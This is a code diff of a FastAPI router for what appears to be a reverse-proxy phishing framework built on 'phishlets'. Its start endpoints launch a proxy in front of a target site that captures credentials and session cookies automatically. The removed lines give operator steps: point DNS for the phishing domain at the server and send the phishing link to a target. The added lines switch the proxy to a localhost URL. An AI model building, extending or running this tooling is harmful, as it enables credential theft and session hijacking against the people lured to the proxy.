@@ -188,41 +188,33 @@ async def delete_phishlet(phishlet_id: str):
 # ============== Phishlet Control ==============
 
 @router.post("/phishlets/{phishlet_id}/start")
-async def start_phishlet(phishlet_id: str, port: int = Query(default=8443)):
+async def start_phishlet(phishlet_id: str, port: int = Query(default=8020)):
     """Start a phishlet proxy server"""
     config = proxy_engine.get_phishlet(phishlet_id)
     if not config:
         raise HTTPException(status_code=404, detail="Phishlet not found")
 
-    # If not already running, start it
-    if not config.is_active:
-        try:
-            await proxy_engine.start_phishlet(phishlet_id, port)
-        except Exception as e:
-            raise HTTPException(status_code=500, detail=str(e))
+    # Start the phishlet (will start server if needed)
+    try:
+        result = await proxy_engine.start_phishlet(phishlet_id, port)
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
 
-    # Use the actual port the phishlet is running on
-    actual_port = config.listen_port or port
+    actual_port = result.get('port', port)
+    proxy_url = f"http://localhost:{actual_port}/{phishlet_id}/"
 
     return {
         'status': 'running',
         'phishlet_id': phishlet_id,
         'name': config.name,
         'port': actual_port,
-        'proxy_url': f"http://0.0.0.0:{actual_port}",
-        'phishing_url': f"https://{config.phishing_host}",
+        'proxy_url': proxy_url,
         'instructions': [
-            f"1. Point DNS for {config.phishing_host} to this server's IP",
-            f"2. Proxy is listening on port {actual_port}",
-            f"3. Send the phishing link to your target: https://{config.phishing_host}",
-            "4. Credentials and session cookies will be captured automatically",
-            "5. Check /sessions endpoint for captured data",
+            f"1. Open the proxy URL: {proxy_url}",
+            f"2. This proxies requests to {config.target_host}",
+            "3. Credentials and session cookies will be captured automatically",
+            "4. Check /sessions endpoint for captured data",
         ],
-        'dns_setup': {
-            'type': 'A',
-            'name': config.phishing_host,
-            'value': 'YOUR_SERVER_IP'
-        }
     }
 
 
@@ -446,43 +438,42 @@ async def delete_target(target_id: str):
 
 
 @router.post("/sessions/start")
-async def start_session_compat(target_id: str = Query(...), listen_port: int = Query(default=8443)):
+async def start_session_compat(target_id: str = Query(...), listen_port: int = Query(default=8020)):
     """Start a phishlet session (for frontend compatibility)"""
     config = proxy_engine.get_phishlet(target_id)
     if not config:
         raise HTTPException(status_code=404, detail="Phishlet not found")
 
-    # If already running, just return the session info
-    if not config.is_active:
-        try:
-            await proxy_engine.start_phishlet(target_id, listen_port)
-        except Exception as e:
-            raise HTTPException(status_code=500, detail=str(e))
+    # Start the phishlet (will start server if needed)
+    try:
+        result = await proxy_engine.start_phishlet(target_id, listen_port)
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
 
-    # Use the actual port the phishlet is running on
-    actual_port = config.listen_port or listen_port
+    # Use the actual port from the result
+    actual_port = result.get('port', listen_port)
+    proxy_url = f"http://localhost:{actual_port}/{target_id}/"
 
     return {
         'status': 'running',
         'session': {
             'id': target_id,
+            'target_id': target_id,
             'target_name': config.name,
             'target_url': f"{config.target_scheme}://{config.target_host}",
-            'proxy_url': f"https://{config.phishing_host}",
-            'phishing_host': config.phishing_host,
+            'proxy_url': proxy_url,
             'port': actual_port,
             'status': 'active',
         },
         'instructions': [
-            f"Point DNS for {config.phishing_host} to this server's IP",
-            f"Proxy is listening on port {actual_port}",
-            f"Send the phishing link to your target: https://{config.phishing_host}",
-            "Credentials and session cookies will be captured automatically",
+            f"Open the proxy URL in your browser: {proxy_url}",
+            f"This will proxy requests to {config.target_host}",
+            "Any credentials entered will be captured automatically",
             "Check the Captures tab for captured data",
         ],
         'technical_notes': [
             f"Target: {config.target_host}",
-            f"Phishing domain: {config.phishing_host}",
+            f"Proxy URL: {proxy_url}",
             f"Capture fields: {', '.join(config.capture_fields)}",
             f"Auth URLs monitored: {len(config.auth_urls)} URLs",
         ],
